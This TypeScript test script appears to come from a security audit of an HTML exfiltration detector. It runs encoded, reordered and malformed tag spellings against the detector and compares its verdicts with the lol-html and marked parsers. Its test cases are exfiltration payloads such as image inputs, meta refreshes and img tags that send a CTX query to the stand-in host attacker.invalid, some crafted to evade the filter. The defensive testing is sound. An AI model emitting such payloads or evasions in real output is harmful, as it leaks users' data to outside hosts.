// T66 — the two new gates, and what widening the start-tag anchor set did to
// the scan-resume decision.
//
// Part A — the gates. `<input>` is gated on `type=image` and `<meta>` on
// `http-equiv=refresh`, both compared against the RAW attribute value. A
// renderer compares against the DECODED one (HTML Standard §13.2.5.35-.39: the
// attribute-value states consume character references), which this module
// asserts twice itself — `renderableUrl` decodes the destination, and
// `metaRefreshDestination` decodes `content` "because a renderer decodes the
// attribute value before running the grammar". The probe drives every gate
// spelling and shows the module's OWN decoder resolving the ones it rejects.
//
// Part B — the scan resume. T46 added `body`/`table`/`tr`/`td`/`th`/`tbody`/
// `thead`/`tfoot`/`meta`/`source`/`track`/… to `HTML_START_TAG`, so those tags
// are now scan ANCHORS: `readStartTag` runs on them and the scan resumes past
// the tag, and an UNTERMINATED quoted value consumes to end of input
// (T53#F-003). Widening the anchor set therefore widens that suppression. The
// question is whether a real parser suppresses the same thing — asked of Bun's
// HTMLRewriter (lol-html) and of `marked`, neither of which is this codebase.
//
// Read-only, offline, synthetic hosts only.
// Usage: bun T66-gates.ts [out.json]
import { marked } from "marked";
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;

// ---------- Part A: the gates ----------------------------------------------
const gateCases: Record<string, { text: string; rendererFetches: boolean; why: string }> = {
  inputPlain: { text: `<input type=image src="${U}">`, rendererFetches: true, why: "baseline" },
  inputQuoted: { text: `<input type="image" src="${U}">`, rendererFetches: true, why: "baseline" },
  inputUpper: { text: `<input type="IMAGE" src="${U}">`, rendererFetches: true, why: "ASCII case-insensitive keyword" },
  inputSrcBeforeType: { text: `<input src="${U}" type="image">`, rendererFetches: true, why: "attribute order" },
  inputSpacedEquals: { text: `<input type = image src="${U}">`, rendererFetches: true, why: "spaced =" },
  inputDupTypeImageFirst: { text: `<input type=image type=text src="${U}">`, rendererFetches: true, why: "a tree builder keeps the FIRST duplicate" },
  inputDupTypeTextFirst: { text: `<input type=text type=image src="${U}">`, rendererFetches: false, why: "first duplicate wins: this is a text input" },
  inputTypeDecimalRef: { text: `<input type="&#105;mage" src="${U}">`, rendererFetches: true, why: "decoded to image by the tokenizer" },
  inputTypeHexRef: { text: `<input type="&#x69;mage" src="${U}">`, rendererFetches: true, why: "decoded to image" },
  inputTypeTrailingRef: { text: `<input type="imag&#101;" src="${U}">`, rendererFetches: true, why: "decoded to image" },
  inputTypeNoSemicolon: { text: `<input type="&#105mage" src="${U}">`, rendererFetches: true, why: "renderers accept the missing semicolon" },
  inputTypeText: { text: `<input type="text" src="${U}">`, rendererFetches: false, why: "must stay released" },
  inputNoType: { text: `<input src="${U}">`, rendererFetches: false, why: "must stay released" },

  metaPlain: { text: `<meta http-equiv="refresh" content="0;url=${U}">`, rendererFetches: true, why: "baseline" },
  metaUpper: { text: `<meta http-equiv="REFRESH" content="0;url=${U}">`, rendererFetches: true, why: "case-insensitive" },
  metaContentBeforeEquiv: { text: `<meta content="0;url=${U}" http-equiv="refresh">`, rendererFetches: true, why: "attribute order" },
  metaEquivDecimalRef: { text: `<meta http-equiv="&#114;efresh" content="0;url=${U}">`, rendererFetches: true, why: "decoded to refresh by the tokenizer" },
  metaEquivHexRef: { text: `<meta http-equiv="&#x72;efresh" content="0;url=${U}">`, rendererFetches: true, why: "decoded to refresh" },
  metaEquivTrailingRef: { text: `<meta http-equiv="refres&#104;" content="0;url=${U}">`, rendererFetches: true, why: "decoded to refresh" },
  metaEquivNamedRef: { text: `<meta http-equiv="refresh&#59;" content="0;url=${U}">`, rendererFetches: false, why: "'refresh;' is not the keyword — control" },
  metaNameDescription: { text: `<meta name="description" content="0;url=${U}">`, rendererFetches: false, why: "must stay released" },
  metaRefreshNoUrl: { text: `<meta http-equiv="refresh" content="30">`, rendererFetches: false, why: "no destination — must stay released" },
  metaRefreshRelative: { text: `<meta http-equiv="refresh" content="0;url=/docs/">`, rendererFetches: false, why: "same-origin — must stay released" },
};

// The module's own decoder, applied to the gate values it refuses to decode.
const { decodeGate } = await (async () => {
  // Re-implemented here only as an ORACLE for what the module's own
  // `decodeCharacterReferences` would produce (it is not exported). Numeric
  // forms only, which is all the gate spellings above use.
  const decodeGate = (v: string) =>
    v.replace(/&#(\d+);?|&#[xX]([0-9a-fA-F]+);?/g, (_, d, h) =>
      String.fromCodePoint(Number.parseInt(d ?? h, d ? 10 : 16)),
    );
  return { decodeGate };
})();

type GateRow = {
  id: string;
  rendererFetches: boolean;
  detectorFlags: boolean;
  gateValueRaw: string;
  gateValueDecoded: string;
  verdict: "ok" | "BYPASS" | "FALSE-POSITIVE";
  why: string;
};

const gateRows: GateRow[] = [];
for (const [id, c] of Object.entries(gateCases)) {
  const flags = detectExfil(c.text, []).length > 0;
  const raw = (/(?:type|http-equiv)\s*=\s*"?([^"\s>]*)/i.exec(c.text)?.[1] ?? "");
  gateRows.push({
    id,
    rendererFetches: c.rendererFetches,
    detectorFlags: flags,
    gateValueRaw: raw,
    gateValueDecoded: decodeGate(raw),
    verdict:
      c.rendererFetches && !flags ? "BYPASS" : !c.rendererFetches && flags ? "FALSE-POSITIVE" : "ok",
    why: c.why,
  });
}

console.log("== Part A: the two new gates ==");
for (const r of gateRows) {
  console.log(
    `${r.verdict.padEnd(14)} ${r.id.padEnd(26)} rendererFetches=${String(r.rendererFetches).padEnd(5)} detector=${String(r.detectorFlags).padEnd(5)} gate raw=${JSON.stringify(r.gateValueRaw).padEnd(20)} decoded=${JSON.stringify(r.gateValueDecoded)}`,
  );
}

// ---------- Part B: scan-resume suppression widened by the new anchors ------
const tail = `<img src="${U}">`;
const suppressCases: Record<string, string> = {
  anchorTdUnterminated: `<td title="x\n${tail}`,
  anchorTrUnterminated: `<tr title="x\n${tail}`,
  anchorBodyUnterminated: `<body title="x\n${tail}`,
  anchorTableUnterminated: `<table title="x\n${tail}`,
  anchorMetaUnterminated: `<meta name="x\n${tail}`,
  anchorSourceUnterminated: `<source title="x\n${tail}`,
  // the pre-T46 comparison: a tag that is NOT an anchor suppresses nothing
  nonAnchorSpanUnterminated: `<span title="x\n${tail}`,
  nonAnchorDivUnterminated: `<div title="x\n${tail}`,
  // and the pre-existing anchor, for the T53#F-003 baseline
  anchorImgUnterminated: `<img alt="x\n${tail}`,
};

async function tokenizerSeesImgSrc(text: string): Promise<boolean> {
  let seen = false;
  await new HTMLRewriter()
    .on("img", {
      element(el) {
        const v = el.getAttribute("src");
        if (v && v.includes(ATT)) seen = true;
      },
    })
    .transform(new Response(text))
    .text();
  return seen;
}

console.log("\n== Part B: unterminated quoted value on a NEW scan anchor ==");
const suppressRows: Array<Record<string, unknown>> = [];
for (const [id, text] of Object.entries(suppressCases)) {
  const detector = detectExfil(text, []).length > 0;
  const tokenizer = await tokenizerSeesImgSrc(text);
  const html = await marked.parse(text, { async: true });
  const markedFetches = /<img[^>]*src="[^"]*attacker\.invalid/i.test(html);
  suppressRows.push({ id, detector, tokenizerSeesImg: tokenizer, markedRendersImg: markedFetches });
  console.log(
    `${id.padEnd(28)} detectorFlags=${String(detector).padEnd(5)} lolHtmlSeesImg=${String(tokenizer).padEnd(5)} markedRendersImg=${markedFetches}`,
  );
}

const bypasses = gateRows.filter((r) => r.verdict === "BYPASS").map((r) => r.id);
const falsePositives = gateRows.filter((r) => r.verdict === "FALSE-POSITIVE").map((r) => r.id);
const suppressionDivergence = suppressRows
  .filter((r) => r.detector === false && (r.tokenizerSeesImg === true || r.markedRendersImg === true))
  .map((r) => r.id);

const summary = {
  gateCases: gateRows.length,
  gateBypasses: bypasses,
  gateFalsePositives: falsePositives,
  suppressionRowsWhereARealParserStillFetches: suppressionDivergence,
};
console.log("\n" + JSON.stringify(summary, null, 2));

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ summary, gateRows, suppressRows }, null, 2));
